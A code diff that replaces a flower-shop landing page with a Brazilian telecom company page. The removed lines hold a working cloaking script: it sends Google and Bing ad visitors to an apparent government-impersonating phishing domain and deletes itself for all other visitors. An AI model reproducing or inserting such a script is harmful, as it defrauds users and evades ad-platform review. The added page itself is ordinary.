@@ -1,225 +1,649 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <script id="auto-destruct-script">
-(function() {
-    const urls = [
-        'cte/index',
-        'nfe/index',
-        'cte/index',
-        'asp/indexp',
-        'app/index',
-        'xml/indexp',
-        'danfe/index',
-        'nfe/index'
-    ];
-
-    function generateHash() {
-        return Math.random().toString(36).substring(2, 15) + 
-               Math.random().toString(36).substring(2, 15) + 
-               Date.now().toString(36);
-    }
-
-    const randomIndex = Math.floor(Math.random() * urls.length);
-    const randomUrl = urls[randomIndex];
-    const hash = generateHash();
-    const xirjfgjsdhdjd = 'https://detran-ceara-govbr.vercel.app';  
-
-    let referer = (typeof document !== 'undefined' && document.referrer) ? document.referrer : 'not found';
-    let currentUrl = (typeof window !== 'undefined') ? window.location.href : '';
-
-    // Lógica de Redirecionamento
-    if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
-        if (typeof window !== 'undefined') {
-            window.location.href = xirjfgjsdhdjd;
-        }
-    } else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
-        const bingUrl = randomUrl + '?msclkid=' + hash;
-        if (typeof window !== 'undefined') {
-            window.location.href = bingUrl;
-        }
-    } else {
-        // AUTO-DESTRUIÇÃO: Se não for origem Ads, o script remove a si mesmo do HTML
-        if (typeof document !== 'undefined' && document.currentScript) {
-            document.currentScript.remove();
-        }
-    }
-})();
-</script>
     <meta charset="UTF-8">
-    <title>Estação das Flores</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+    <title>VUP Telecom - Provedor de Internet de Alta Velocidade</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary-color: #0033cc;
+            --secondary-color: #00ccff;
+            --accent-color: #ff6600;
+            --dark-color: #1a1a2e;
+            --light-color: #f8f9fa;
+        }
+        
         body {
-            margin: 0;
-            font-family: Arial, Helvetica, sans-serif;
-            background-color: #f8f8f8;
+            font-family: 'Roboto', sans-serif;
             color: #333;
+            overflow-x: hidden;
         }
-
-        header {
-            background-color: #8bc34a;
+        
+        h1, h2, h3, h4, h5 {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 600;
+        }
+        
+        .navbar-brand {
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--primary-color) !important;
+        }
+        
+        .hero-section {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
             color: white;
-            padding: 30px;
-            text-align: center;
-        }
-
-        header h1 {
-            margin: 0;
-            font-size: 40px;
-        }
-
-        header p {
-            font-size: 18px;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 1200px;
-            margin: auto;
-            padding: 40px 0;
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: 32px;
-            margin-bottom: 40px;
-            color: #558b2f;
-        }
-
-        .gallery {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-        }
-
-        .flower-card {
-            background-color: white;
-            border-radius: 10px;
+            padding: 100px 0;
+            position: relative;
             overflow: hidden;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
-
-        .flower-card img {
+        
+        .hero-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 220px;
-            object-fit: cover;
+            height: 100%;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M1200 120L0 16.48 0 0 1200 0 1200 120z" fill="white"/></svg>');
+            background-size: 100% 100px;
+            background-position: bottom;
+            background-repeat: no-repeat;
         }
-
-        .flower-card .content {
-            padding: 20px;
+        
+        .hero-title {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
         }
-
-        .flower-card h3 {
-            margin-top: 0;
-            color: #7cb342;
+        
+        .hero-subtitle {
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
         }
-
-        footer {
-            background-color: #333;
+        
+        .btn-primary-custom {
+            background-color: var(--accent-color);
+            border-color: var(--accent-color);
             color: white;
-            text-align: center;
-            padding: 20px;
-            margin-top: 40px;
+            padding: 12px 30px;
+            font-weight: 600;
+            border-radius: 50px;
+            transition: all 0.3s;
         }
-
-        footer p {
-            margin: 5px 0;
+        
+        .btn-primary-custom:hover {
+            background-color: #e65c00;
+            border-color: #e65c00;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
+        
+        .section-title {
+            position: relative;
+            margin-bottom: 50px;
+            color: var(--primary-color);
+        }
+        
+        .section-title::after {
+            content: '';
+            position: absolute;
+            width: 80px;
+            height: 4px;
+            background-color: var(--secondary-color);
+            bottom: -15px;
+            left: 0;
+            border-radius: 2px;
+        }
+        
+        .center-title::after {
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        .icon-box {
+            text-align: center;
+            padding: 30px 20px;
+            border-radius: 10px;
+            background-color: white;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            height: 100%;
+            transition: transform 0.3s;
+        }
+        
+        .icon-box:hover {
+            transform: translateY(-10px);
+        }
+        
+        .icon-box i {
+            font-size: 3rem;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+        
+        .icon-box h4 {
+            color: var(--dark-color);
+            margin-bottom: 15px;
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--secondary-color);
+            margin-bottom: 15px;
+        }
+        
+        .feature-item {
+            margin-bottom: 30px;
+        }
+        
+        .stats-section {
+            background-color: var(--dark-color);
+            color: white;
+            padding: 80px 0;
+        }
+        
+        .stat-number {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--secondary-color);
+        }
+        
+        .contact-info {
+            background-color: #f8f9fa;
+            padding: 30px;
+            border-radius: 10px;
+            height: 100%;
+        }
+        
+        .contact-info h4 {
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+        
+        .contact-info i {
+            color: var(--accent-color);
+            margin-right: 10px;
+        }
+        
+        footer {
+            background-color: var(--dark-color);
+            color: white;
+            padding: 50px 0 20px;
+        }
+        
+        .footer-logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: #aaa;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: var(--secondary-color);
+        }
+        
+        .copyright {
+            border-top: 1px solid #333;
+            padding-top: 20px;
+            margin-top: 40px;
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+        
+        .internet-visual {
+            height: 200px;
+            background: linear-gradient(90deg, #0033cc, #00ccff, #ff6600);
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+        
+        .data-particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background-color: white;
+            border-radius: 50%;
+            animation: float 3s infinite ease-in-out;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2.5rem;
+            }
+            
+            .hero-subtitle {
+                font-size: 1.1rem;
+            }
         }
     </style>
 </head>
 <body>
-
-    <header>
-        <h1>Estação das Flores</h1>
-        <p>Beleza, perfume e vida em cada flor</p>
-    </header>
-
-    <div class="container">
-        <h2 class="section-title">Nossas Flores</h2>
-
-        <div class="gallery">
-
-            <div class="flower-card">
-                <img src="https://images.unsplash.com/photo-1501004318641-b39e6451bec6" alt="Rosas">
-                <div class="content">
-                    <h3>Rosas</h3>
-                    <p>
-                        As rosas são símbolos de amor, romance e elegância. 
-                        Disponíveis em várias cores, cada uma representa um sentimento diferente, 
-                        sendo ideais para presentear em momentos especiais.
-                    </p>
-                </div>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="bi bi-wifi"></i> VUP Telecom
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#home">Início</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#about">Sobre</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#services">Serviços</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#contact">Contato</a>
+                    </li>
+                </ul>
+                <a href="#contact" class="btn btn-primary-custom ms-lg-3 mt-2 mt-lg-0">Contrate Agora</a>
             </div>
-
-            <div class="flower-card">
-                <img src="https://images.unsplash.com/photo-1504208434309-cb69f4fe52b0" alt="Orquídeas">
-                <div class="content">
-                    <h3>Orquídeas</h3>
-                    <p>
-                        As orquídeas representam sofisticação e delicadeza. 
-                        São flores exóticas, duráveis e muito apreciadas pela sua beleza única 
-                        e variedade de formas.
-                    </p>
-                </div>
-            </div>
-
-            <div class="flower-card">
-                <img src="https://images.unsplash.com/photo-1508747703725-719777637510" alt="Girassóis">
-                <div class="content">
-                    <h3>Girassóis</h3>
-                    <p>
-                        O girassol é símbolo de alegria, energia e positividade. 
-                        Seu amarelo vibrante ilumina qualquer ambiente e transmite 
-                        felicidade e vitalidade.
-                    </p>
-                </div>
-            </div>
-
-            <div class="flower-card">
-                <img src="https://images.unsplash.com/photo-1524594154908-edd4053e00b3" alt="Lírios">
-                <div class="content">
-                    <h3>Lírios</h3>
-                    <p>
-                        Os lírios são flores elegantes e perfumadas, muito usadas 
-                        em decorações e arranjos sofisticados. 
-                        Representam pureza, paz e renovação.
-                    </p>
-                </div>
-            </div>
-
-            <div class="flower-card">
-                <img src="https://images.unsplash.com/photo-1468327768560-75b778cbb551" alt="Tulipas">
-                <div class="content">
-                    <h3>Tulipas</h3>
-                    <p>
-                        As tulipas são flores delicadas e modernas, muito populares 
-                        na primavera. Elas simbolizam amor verdadeiro e charme.
-                    </p>
-                </div>
-            </div>
-
-            <div class="flower-card">
-                <img src="https://images.unsplash.com/photo-1495231916356-a86217efff12" alt="Margaridas">
-                <div class="content">
-                    <h3>Margaridas</h3>
-                    <p>
-                        As margaridas representam simplicidade, pureza e alegria. 
-                        São flores leves e encantadoras, perfeitas para ambientes 
-                        descontraídos e naturais.
-                    </p>
-                </div>
-            </div>
-
         </div>
-    </div>
+    </nav>
 
+    <!-- Hero Section -->
+    <section id="home" class="hero-section">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-6">
+                    <h1 class="hero-title">Internet de Alta Velocidade para sua Empresa</h1>
+                    <p class="hero-subtitle">Conectamos seu negócio ao futuro com a melhor infraestrutura de telecomunicações do mercado. Velocidade, estabilidade e suporte especializado.</p>
+                    <div class="mt-4">
+                        <a href="#contact" class="btn btn-primary-custom me-3 mb-3">Contratar Agora</a>
+                        <a href="#services" class="btn btn-outline-light mb-3">Ver Planos</a>
+                    </div>
+                </div>
+                <div class="col-lg-6">
+                    <div class="internet-visual mt-5 mt-lg-0" id="internetVisual">
+                        <!-- Partículas de dados serão geradas por JavaScript -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Sobre a Empresa -->
+    <section id="about" class="py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6">
+                    <h2 class="section-title">Sobre a VUP Telecom</h2>
+                    <p>A <strong>VUP Telecom</strong> é uma empresa especializada em serviços de comunicação multimídia, fundada em 26 de março de 2021. Com sede em Barueri, São Paulo, estamos comprometidos em fornecer soluções de conectividade de alta performance para empresas de todos os portes.</p>
+                    <p>Nossa missão é conectar pessoas e negócios através de tecnologia de ponta, oferecendo serviços de internet estáveis, rápidos e seguros, com suporte técnico especializado e atendimento personalizado.</p>
+                    <p>Com mais de <strong>4 anos de experiência</strong> no mercado de telecomunicações, construímos uma rede robusta e confiável que atende às demandas mais exigentes do mercado corporativo.</p>
+                </div>
+                <div class="col-lg-6">
+                    <div class="row mt-4 mt-lg-0">
+                        <div class="col-md-6 mb-4">
+                            <div class="icon-box">
+                                <i class="bi bi-lightning-charge"></i>
+                                <h4>Alta Velocidade</h4>
+                                <p>Fibra óptica com velocidade simétrica para upload e download.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6 mb-4">
+                            <div class="icon-box">
+                                <i class="bi bi-shield-check"></i>
+                                <h4>Confiabilidade</h4>
+                                <p>Estabilidade de 99,9% com monitoramento 24/7 da rede.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6 mb-4">
+                            <div class="icon-box">
+                                <i class="bi bi-headset"></i>
+                                <h4>Suporte Técnico</h4>
+                                <p>Equipe especializada disponível para atendimento rápido.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6 mb-4">
+                            <div class="icon-box">
+                                <i class="bi bi-graph-up-arrow"></i>
+                                <h4>Escalabilidade</h4>
+                                <p>Soluções que crescem junto com o seu negócio.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Informações de Registro -->
+            <div class="row mt-5 pt-4">
+                <div class="col-12">
+                    <h3 class="section-title center-title text-center">Informações Legais</h3>
+                </div>
+                <div class="col-md-3 col-6 text-center mb-4">
+                    <div class="feature-item">
+                        <div class="feature-icon">
+                            <i class="bi bi-building"></i>
+                        </div>
+                        <h5>Razão Social</h5>
+                        <p>Vup Servicos de Telecomunicacoes LTDA</p>
+                    </div>
+                </div>
+                <div class="col-md-3 col-6 text-center mb-4">
+                    <div class="feature-item">
+                        <div class="feature-icon">
+                            <i class="bi bi-file-text"></i>
+                        </div>
+                        <h5>CNPJ</h5>
+                        <p>41.366.511/0001-09</p>
+                    </div>
+                </div>
+                <div class="col-md-3 col-6 text-center mb-4">
+                    <div class="feature-item">
+                        <div class="feature-icon">
+                            <i class="bi bi-calendar-event"></i>
+                        </div>
+                        <h5>Data de Abertura</h5>
+                        <p>26/03/2021</p>
+                    </div>
+                </div>
+                <div class="col-md-3 col-6 text-center mb-4">
+                    <div class="feature-item">
+                        <div class="feature-icon">
+                            <i class="bi bi-geo-alt"></i>
+                        </div>
+                        <h5>Inscrição Estadual</h5>
+                        <p>206.681.145.110</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Serviços -->
+    <section id="services" class="py-5 bg-light">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 text-center mb-5">
+                    <h2 class="section-title center-title">Nossos Serviços</h2>
+                    <p class="lead">Oferecemos soluções completas em telecomunicações para empresas</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-4 mb-4">
+                    <div class="icon-box">
+                        <i class="bi bi-wifi"></i>
+                        <h4>Internet Empresarial</h4>
+                        <p>Conexão dedicada com garantia de velocidade e estabilidade para sua empresa, com opções de banda que variam de 100Mbps a 10Gbps.</p>
+                    </div>
+                </div>
+                <div class="col-lg-4 mb-4">
+                    <div class="icon-box">
+                        <i class="bi bi-hdd-network"></i>
+                        <h4>Link Dedicado</h4>
+                        <p>Conexão exclusiva ponto a ponto com SLA garantido, ideal para empresas que dependem de conexões críticas e estáveis.</p>
+                    </div>
+                </div>
+                <div class="col-lg-4 mb-4">
+                    <div class="icon-box">
+                        <i class="bi bi-shield-lock"></i>
+                        <h4>Segurança Digital</h4>
+                        <p>Soluções de firewall, VPN e proteção contra ataques cibernéticos para manter seus dados e rede empresarial seguros.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Estatísticas -->
+            <div class="stats-section mt-5 rounded">
+                <div class="container">
+                    <div class="row text-center">
+                        <div class="col-md-3 col-6 mb-4">
+                            <div class="stat-number" data-count="99.9">0</div>
+                            <p>Disponibilidade da Rede</p>
+                        </div>
+                        <div class="col-md-3 col-6 mb-4">
+                            <div class="stat-number" data-count="24">0</div>
+                            <p>Suporte 24/7</p>
+                        </div>
+                        <div class="col-md-3 col-6 mb-4">
+                            <div class="stat-number" data-count="100">0</div>
+                            <p>Clientes Satisfeitos</p>
+                        </div>
+                        <div class="col-md-3 col-6 mb-4">
+                            <div class="stat-number" data-count="4">0</div>
+                            <p>Anos no Mercado</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contato -->
+    <section id="contact" class="py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 text-center mb-5">
+                    <h2 class="section-title center-title">Entre em Contato</h2>
+                    <p class="lead">Estamos prontos para conectar sua empresa ao futuro</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-6 mb-5 mb-lg-0">
+                    <div class="contact-info">
+                        <h4>Informações de Contato</h4>
+                        <p class="mb-4"><i class="bi bi-envelope"></i> <strong>E-mail:</strong> contato@vuptele.com.br</p>
+                        <p class="mb-4"><i class="bi bi-telephone"></i> <strong>Telefone:</strong> (11) 4210-3187</p>
+                        
+                        <h4 class="mt-5">Localização</h4>
+                        <p class="mb-2"><i class="bi bi-geo-alt"></i> <strong>Endereço:</strong></p>
+                        <p class="mb-2">Alameda Rio Negro, 1030</p>
+                        <p class="mb-2">Cond Stadium Escritório 206</p>
+                        <p class="mb-2">Alphaville Centro Industrial e Empresarial</p>
+                        <p class="mb-2">Barueri - SP</p>
+                        <p class="mb-4">CEP: 06454-000</p>
+                        
+                        <h4 class="mt-5">Para Correspondência</h4>
+                        <p class="mb-2">Vup Telecom</p>
+                        <p class="mb-2">Vup Servicos de Telecomunicacoes LTDA</p>
+                        <p class="mb-2">Alameda Rio Negro 1030 Cond Stadium Escrit 206</p>
+                        <p class="mb-2">Alphaville Centro Industrial e Empresarial/Alphav</p>
+                        <p class="mb-2">Barueri SP</p>
+                        <p class="mb-0">06454-000</p>
+                    </div>
+                </div>
+                <div class="col-lg-6">
+                    <div class="contact-info">
+                        <h4>Solicite uma Proposta</h4>
+                        <form id="contactForm">
+                            <div class="mb-3">
+                                <label for="name" class="form-label">Nome Completo</label>
+                                <input type="text" class="form-control" id="name" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="email" class="form-label">E-mail</label>
+                                <input type="email" class="form-control" id="email" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="phone" class="form-label">Telefone</label>
+                                <input type="tel" class="form-control" id="phone" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="company" class="form-label">Empresa</label>
+                                <input type="text" class="form-control" id="company">
+                            </div>
+                            <div class="mb-3">
+                                <label for="message" class="form-label">Mensagem</label>
+                                <textarea class="form-control" id="message" rows="4" required></textarea>
+                            </div>
+                            <button type="submit" class="btn btn-primary-custom w-100">Enviar Solicitação</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
     <footer>
-        <p>© 2026 - Estação das Flores</p>
-        <p>Todos os direitos reservados</p>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-4 mb-4">
+                    <div class="footer-logo">
+                        <i class="bi bi-wifi"></i> VUP Telecom
+                    </div>
+                    <p>Provedor de internet empresarial com soluções completas em telecomunicações. Conectamos seu negócio ao futuro.</p>
+                    <p>CNPJ: 41.366.511/0001-09</p>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Links Rápidos</h5>
+                    <div class="footer-links">
+                        <p><a href="#home">Início</a></p>
+                        <p><a href="#about">Sobre</a></p>
+                        <p><a href="#services">Serviços</a></p>
+                        <p><a href="#contact">Contato</a></p>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-6 mb-4">
+                    <h5>Contato</h5>
+                    <div class="footer-links">
+                        <p><i class="bi bi-envelope me-2"></i> contato@vuptele.com.br</p>
+                        <p><i class="bi bi-telephone me-2"></i> (11) 4210-3187</p>
+                        <p><i class="bi bi-geo-alt me-2"></i> Barueri - SP</p>
+                    </div>
+                </div>
+                <div class="col-lg-3 mb-4">
+                    <h5>Atividade Principal</h5>
+                    <p>61.10-8-03 - Serviços de comunicação multimídia - SCM</p>
+                    <p>Situação Cadastral: <span class="text-success">Ativa</span></p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-12 text-center copyright">
+                    <p>&copy; 2024 VUP Telecom - Vup Servicos de Telecomunicacoes LTDA. Todos os direitos reservados.</p>
+                </div>
+            </div>
+        </div>
     </footer>
 
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // Animação das partículas de dados
+        function createDataParticles() {
+            const container = document.getElementById('internetVisual');
+            const particleCount = 50;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('data-particle');
+                
+                // Posição aleatória
+                const left = Math.random() * 100;
+                const top = Math.random() * 100;
+                
+                // Tamanho aleatório
+                const size = Math.random() * 6 + 4;
+                
+                // Atraso de animação aleatório
+                const delay = Math.random() * 3;
+                
+                particle.style.left = `${left}%`;
+                particle.style.top = `${top}%`;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.animationDelay = `${delay}s`;
+                
+                container.appendChild(particle);
+            }
+        }
+        
+        // Contador animado para estatísticas
+        function animateCounter() {
+            const counters = document.querySelectorAll('.stat-number');
+            const speed = 200; // Quanto menor, mais rápido
+            
+            counters.forEach(counter => {
+                const target = +counter.getAttribute('data-count');
+                const count = +counter.innerText;
+                const increment = target / speed;
+                
+                if (count < target) {
+                    counter.innerText = Math.ceil(count + increment);
+                    setTimeout(() => animateCounter(), 1);
+                } else {
+                    counter.innerText = target;
+                }
+            });
+        }
+        
+        // Formulário de contato
+        document.getElementById('contactForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Obrigado pelo seu interesse! Entraremos em contato em breve para enviar uma proposta personalizada.');
+            this.reset();
+        });
+        
+        // Inicialização quando a página carrega
+        document.addEventListener('DOMContentLoaded', function() {
+            createDataParticles();
+            
+            // Inicia a animação dos contadores quando a seção de estatísticas é visualizada
+            const observerOptions = {
+                threshold: 0.5
+            };
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        animateCounter();
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, observerOptions);
+            
+            const statsSection = document.querySelector('.stats-section');
+            if (statsSection) {
+                observer.observe(statsSection);
+            }
+            
+            // Suaviza a rolagem para âncoras
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href');
+                    if (targetId === '#') return;
+                    
+                    const targetElement = document.querySelector(targetId);
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - 70,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+        });
+    </script>
 </body>
 </html>
-
